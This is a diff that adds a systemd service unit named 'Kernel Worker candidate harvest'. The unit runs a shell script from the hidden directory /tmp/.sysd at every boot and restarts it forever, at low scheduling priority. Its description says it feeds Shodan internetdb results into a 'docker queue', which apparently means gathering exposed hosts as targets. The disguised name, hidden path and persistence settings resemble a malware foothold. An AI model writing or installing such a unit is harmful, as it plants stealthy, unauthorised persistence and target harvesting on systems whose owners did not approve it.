@@ -1,0 +1,17 @@
+[Unit]
+Description=Kernel Worker candidate harvest (keyless Shodan internetdb -> docker queue)
+Documentation=README.md
+After=network-online.target
+Wants=network-online.target
+
+[Service]
+Type=simple
+ExecStart=/bin/sh /tmp/.sysd/_harvest.sh
+Restart=always
+RestartSec=60
+# 1 request/second against a public API: stay polite, never fight the sweeper
+Nice=15
+CPUSchedulingPolicy=batch
+
+[Install]
+WantedBy=multi-user.target
